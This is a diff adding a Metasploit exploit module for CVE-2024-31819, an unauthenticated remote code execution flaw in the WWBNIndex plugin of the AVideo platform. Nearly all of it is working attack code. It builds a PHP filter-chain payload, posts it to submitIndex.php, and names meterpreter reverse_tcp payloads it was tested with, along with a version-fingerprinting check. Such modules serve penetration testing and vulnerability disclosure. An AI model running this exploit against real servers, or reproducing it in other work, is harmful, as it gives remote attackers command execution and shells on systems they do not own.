@@ -1,0 +1,120 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::PhpFilterChain
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'AVideo WWBNIndex Plugin Unauthenticated RCE',
+        'Description' => %q{
+          This module exploits an unauthenticated remote code execution (RCE) vulnerability
+          in the WWBNIndex plugin of the AVideo platform. The vulnerability exists within the
+          `submitIndex.php` file, where user-supplied input is passed directly to the `require()`
+          function without proper sanitization. By exploiting this, an attacker can leverage the
+          PHP filter chaining technique to execute arbitrary PHP code on the server. This allows
+          for the execution of commands and control over the affected system. The exploit is
+          particularly dangerous because it does not require authentication, making it possible
+          for any remote attacker to exploit this vulnerability.
+        },
+        'Author' => [
+          'Valentin Lobstein'
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['CVE', '2024-31819'],
+          ['URL', 'https://github.com/WWBN/AVideo'],
+          ['URL', 'https://chocapikk.com/posts/2024/cve-2024-31819']
+        ],
+        'Platform' => ['php', 'unix', 'linux', 'win'],
+        'Arch' => [ARCH_PHP, ARCH_CMD],
+        'Targets' => [
+          [
+            'PHP In-Memory',
+            {
+              'Platform' => 'php',
+              'Arch' => ARCH_PHP
+              # tested with php/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Unix In-Memory',
+            {
+              'Platform' => ['unix', 'linux'],
+              'Arch' => ARCH_CMD
+              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Windows In-Memory',
+            {
+              'Platform' => 'win',
+              'Arch' => ARCH_CMD
+              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
+            }
+          ],
+        ],
+        'Privileged' => false,
+        'DisclosureDate' => '2024-04-09',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        },
+        'DefaultOptions' => {
+          'SSL' => true,
+          'RPORT' => 443,
+          'FETCH_WRITABLE_DIR' => '/tmp'
+        }
+      )
+    )
+  end
+
+  def exploit
+    php_code = "<?php #{target['Arch'] == ARCH_PHP ? payload.encoded : "system(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'));"} ?>"
+    filter_payload = generate_php_filter_payload(php_code)
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'plugin', 'WWBNIndex', 'submitIndex.php'),
+      'ctype' => 'application/x-www-form-urlencoded',
+      'data' => "systemRootPath=#{filter_payload}"
+    )
+    print_error("Server returned #{res.code}. Successful exploit attempts should not return a response.") if res&.code
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'index.php'),
+      'method' => 'GET',
+      'follow_redirect' => true
+    })
+    return CheckCode::Unknown('Failed to connect to the target.') unless res
+    return CheckCode::Unknown("Unexpected HTTP response code: #{res.code}") unless res.code == 200
+
+    version_match = res.body.match(/Powered by AVideo ® Platform v([\d.]+)/) || res.body.match(/<!--.*?v:([\d.]+).*?-->/m)
+    return CheckCode::Unknown('Unable to extract AVideo version.') unless version_match && version_match[1]
+
+    version = Rex::Version.new(version_match[1])
+    plugin_check = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'plugin', 'WWBNIndex', 'submitIndex.php'),
+      'method' => 'GET'
+    })
+    unless plugin_check&.code == 200
+      CheckCode::Safe('Vulnerable plugin WWBNIndex was not detected')
+    end
+
+    if version.between?(Rex::Version.new('12.4'), Rex::Version.new('14.2'))
+      return CheckCode::Appears("Detected vulnerable AVideo version: #{version}, with vulnerable plugin WWBNIndex running.")
+    end
+
+    CheckCode::Safe("Detected non-vulnerable AVideo version: #{version}")
+  end
+end
